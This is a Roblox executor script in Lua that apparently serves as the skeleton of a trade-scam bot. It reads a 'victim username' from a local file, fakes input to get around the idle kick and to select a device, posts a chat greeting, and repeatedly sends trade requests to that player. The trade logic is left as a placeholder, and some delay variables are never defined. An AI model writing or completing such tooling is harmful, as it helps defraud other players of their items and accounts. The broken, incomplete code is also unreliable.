
-- Wait for game to load
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade")
local LocalPlayer = Players.LocalPlayer

-- Anti-AFK
local VirtualUser = game:GetService("VirtualUser")
LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- File management
local function setupFiles()
    if not isfile("user.txt") then
        writefile("user.txt", "victim username")
    end
    if not isfile("joined_ids.txt") then
        writefile("joined_ids.txt", "[]")
    end
end
setupFiles()

-- State variables
local victimUser = readfile("user.txt")
local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
local isTrading = false
local lastTradeTime = 0

-- Device selection (for mobile)
local function selectDevice()
    local DeviceSelectGui = LocalPlayer.PlayerGui:FindFirstChild("DeviceSelect")
    if DeviceSelectGui then
        local button = DeviceSelectGui.Container.Phone.Button
        local pos = button.AbsolutePosition
        local size = button.AbsoluteSize
        local center = Vector2.new(pos.X + size.X/2, pos.Y + size.Y/2)
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
        task.wait(0.1)
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
    end
end

-- Trade functions
local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function sendTradeRequest()
    if isTrading then return end
    
    local target = Players:FindFirstChild(victimUser)
    if not target then return end
    
    Trade.SendRequest:InvokeServer(target)
end

local function manageTradeRequests()
    while true do
        local status = getTradeStatus()
        
        if status == "None" then
            sendTradeRequest()
        elseif status == "StartTrade" then
            isTrading = true
            lastTradeTime = os.time()
            -- Add your trade logic here
        else
            Trade.DeclineRequest:FireServer()
        end
        
        task.wait(REQUEST_DELAY)
    end
end

-- Main execution
task.spawn(selectDevice)
task.wait(delay)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')

-- Start trade management
task.spawn(manageTradeRequests)
